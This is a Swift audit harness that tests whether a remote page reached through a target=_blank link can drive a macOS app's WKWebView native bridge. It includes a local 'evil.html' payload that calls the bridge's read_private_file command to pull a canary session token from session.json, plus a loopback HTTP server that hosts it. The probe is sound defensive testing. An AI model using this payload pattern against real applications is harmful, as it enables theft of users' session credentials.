import AppKit
import WebKit

/// Adversarial probe for the macOS shell's webview boundary.
///
/// Reproduces the app's own webview configuration (same scheme handler, same
/// message-handler name, no WKUIDelegate) and loads the app's own index page
/// from `manorama://localhost`. Then it clicks a plain `target="_blank"` link
/// to a remote origin — exactly what the Library's ad CTA and share links do —
/// and asks the remote page to drive the native bridge.
///
/// Everything the app itself would do is done by the app's own code paths:
/// ViewerCoordinator, LocalSchemeHandler and NativeBridge are the shipped
/// files, not copies.

let canaryToken = "AUDIT-CANARY-SESSION-TOKEN"

final class HarnessDelegate: NSObject, NSApplicationDelegate {
    var window: NSWindow!
    var webView: WKWebView!
    var coordinator: ViewerCoordinator!
    var bridge: NativeBridge!
    var schemeHandler: LocalSchemeHandler!
    var root: URL!
    var remotePort: Int = 0

    func applicationDidFinishLaunching(_ notification: Notification) {
        Task { @MainActor in
            do {
                try await run()
                exit(0)
            } catch {
                print("HARNESS-ERROR \(error)")
                exit(2)
            }
        }
    }

    @MainActor
    func run() async throws {
        root = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("audit-bundle-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let remote = try makeBundle()

        // An app-private config dir seeded with a session file, so a leaked
        // value is unmistakable.
        let configDir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("audit-config-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: configDir, withIntermediateDirectories: true)
        try #"{"token":"\#(canaryToken)","ownerSlug":"audit"}"#.write(
            to: configDir.appendingPathComponent("session.json"), atomically: true, encoding: .utf8)

        let granted = GrantedRoots()
        let store = FolderStore(fileURL: configDir.appendingPathComponent("folders.json"), configDir: configDir)
        bridge = NativeBridge(folderStore: store, grantedRoots: granted, configDir: configDir)
        coordinator = ViewerCoordinator()
        coordinator.bridge = bridge
        schemeHandler = LocalSchemeHandler(bundleRoot: root)

        let configuration = WKWebViewConfiguration()
        configuration.setURLSchemeHandler(schemeHandler, forURLScheme: "manorama")
        configuration.userContentController.add(coordinator, name: "manorama")
        webView = WKWebView(frame: NSRect(x: 0, y: 0, width: 1200, height: 800), configuration: configuration)
        webView.navigationDelegate = coordinator
        bridge.webView = webView

        window = NSWindow(contentRect: webView.frame, styleMask: [.titled], backing: .buffered, defer: false)
        window.contentView = webView
        window.makeKeyAndOrderFront(nil)
        NSApp.activate(ignoringOtherApps: true)

        webView.load(URLRequest(url: URL(string: "manorama://localhost/index.html")!))
        try await waitFor("index page", timeout: 20) { [self] in
            (webView.url?.absoluteString ?? "").hasPrefix("manorama://localhost/index.html") && webView.isLoading == false
        }

        let before = try await js("document.title")
        print("STEP1 on bundled page — handler present: \(String(describing: try? await js("String(!!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.manorama))")))  title=\(before ?? "")")

        // Click the target=_blank link the Library ships (ad CTA / share link).
        _ = try await js("document.querySelector('a[target=_blank]').click()")
        try? await Task.sleep(nanoseconds: 3_000_000_000)
        let afterClick = webView.url?.absoluteString ?? "?"
        print("STEP2a after target=_blank click: \(afterClick)")

        if !afterClick.contains("evil.html") {
            // Second external-link idiom in this bundle: window.open().
            _ = try await js("window.open(document.querySelector('a[target=_blank]').href, '_blank', 'noopener')")
            try? await Task.sleep(nanoseconds: 2_000_000_000)
            print("STEP2b after window.open: \(webView.url?.absoluteString ?? "?")")
        }

        if !(webView.url?.absoluteString ?? "").contains("evil.html") {
            // The renderer's other navigation path — a plain location change.
            _ = try await js("location.assign(document.querySelector('a[target=_blank]').href)")
            try await waitFor("navigation to the remote origin", timeout: 20) { [self] in
                (webView.url?.absoluteString ?? "").contains("evil.html") && webView.isLoading == false
            }
        }
        print("STEP2 navigated to \(webView.url?.absoluteString ?? "?")")

        var result: String?
        for _ in 0..<100 {
            let title = try await js("document.title") ?? ""
            if title.hasPrefix("RESULT:") { result = title; break }
            try await Task.sleep(nanoseconds: 100_000_000)
        }
        let fallbackTitle = try await js("document.title") ?? "?"
        print("STEP3 remote page says: \(result ?? "NO RESULT (title=\(fallbackTitle))")")

        // Was the canary actually handed over?
        if let result, result.contains(canaryToken) { print("VERDICT: BRIDGE-LEAKED-SESSION-TOKEN") }
        else { print("VERDICT: BRIDGE-NOT-REACHABLE") }
        _ = remote
    }

    /// index.html mimics the shipped Library's one relevant behaviour: an
    /// anchor with target="_blank" and rel="noopener".
    func makeBundle() throws -> URL {
        let index = """
        <!doctype html><html><head><meta charset="utf-8"><title>bundled</title></head>
        <body><h1>bundled library</h1>
        <a id="ad" href="http://localhost:\(remotePort)/evil.html" target="_blank" rel="noopener">sponsor</a>
        </body></html>
        """
        try index.write(to: root.appendingPathComponent("index.html"), atomically: true, encoding: .utf8)
        return root
    }

    @MainActor
    func waitFor(_ what: String, timeout: Double, _ predicate: () -> Bool) async throws {
        let deadline = Date().addingTimeInterval(timeout)
        while Date() < deadline {
            if predicate() { return }
            try await Task.sleep(nanoseconds: 100_000_000)
        }
        throw NSError(domain: "harness", code: 1, userInfo: [NSLocalizedDescriptionKey: "timed out waiting for \(what)"])
    }

    @discardableResult
    @MainActor
    func js(_ script: String) async throws -> String? {
        try await withCheckedThrowingContinuation { continuation in
            webView.evaluateJavaScript(script) { value, error in
                if let error { continuation.resume(throwing: error) }
                else { continuation.resume(returning: value as? String) }
            }
        }
    }
}

// ---- local "attacker" origin -------------------------------------------------

let serverRoot = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("audit-remote-\(UUID().uuidString)")
try FileManager.default.createDirectory(at: serverRoot, withIntermediateDirectories: true)

let evil = """
<!doctype html><html><head><meta charset="utf-8"><title>remote</title></head><body>
<h1>remote origin</h1>
<script>
(async () => {
  const out = [];
  out.push('origin=' + location.origin);
  out.push('handler=' + !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.manorama));
  try { const r = await fetch('manorama://localhost/api/account'); out.push('directFetch=' + r.status); }
  catch (e) { out.push('directFetch=BLOCKED'); }
  window.__rt = null;
  window.__manoramaShellSettle = (j) => { window.__rt = j; };
  try {
    window.webkit.messageHandlers.manorama.postMessage({ type: 'invoke', id: 7, cmd: 'read_private_file', args: { name: 'session.json' } });
  } catch (e) { out.push('post=THREW'); }
  for (let i = 0; i < 100 && !window.__rt; i++) await new Promise(r => setTimeout(r, 50));
  out.push('bridgeReply=' + JSON.stringify(window.__rt));
  document.title = 'RESULT: ' + out.join(' | ');
})();
</script></body></html>
"""
try evil.write(to: serverRoot.appendingPathComponent("evil.html"), atomically: true, encoding: .utf8)

// Serve it on a fixed loopback port with a minimal HTTP responder.
let listener = socket(AF_INET, SOCK_STREAM, 0)
var yes: Int32 = 1
setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, socklen_t(MemoryLayout<Int32>.size))
var addr = sockaddr_in()
addr.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
addr.sin_family = sa_family_t(AF_INET)
addr.sin_port = in_port_t(0).bigEndian
addr.sin_addr = in_addr(s_addr: inet_addr("127.0.0.1"))
_ = withUnsafePointer(to: &addr) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
    Darwin.bind(listener, $0, socklen_t(MemoryLayout<sockaddr_in>.size)) } }
_ = Darwin.listen(listener, 8)
var bound = sockaddr_in()
var blen = socklen_t(MemoryLayout<sockaddr_in>.size)
_ = withUnsafeMutablePointer(to: &bound) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { getsockname(listener, $0, &blen) } }
let port = UInt16(bigEndian: bound.sin_port)

DispatchQueue.global().async {
    let body = [UInt8](evil.utf8)
    while true {
        var client = sockaddr_in()
        var clen = socklen_t(MemoryLayout<sockaddr_in>.size)
        let fd = withUnsafeMutablePointer(to: &client) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
            Darwin.accept(listener, $0, &clen) } }
        if fd < 0 { continue }
        var buf = [UInt8](repeating: 0, count: 8192)
        _ = Darwin.read(fd, &buf, buf.count)
        let head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: \(body.count)\r\nConnection: close\r\n\r\n"
        _ = head.withCString { Darwin.write(fd, $0, head.utf8.count) }
        _ = body.withUnsafeBytes { Darwin.write(fd, $0.baseAddress, body.count) }
        close(fd)
    }
}

let app = NSApplication.shared
app.setActivationPolicy(.regular)
let delegate = HarnessDelegate()
delegate.remotePort = Int(port)
app.delegate = delegate

// Hard watchdog — the harness must never hang a test run.
DispatchQueue.main.asyncAfter(deadline: .now() + 90) { print("WATCHDOG"); exit(3) }
app.run()
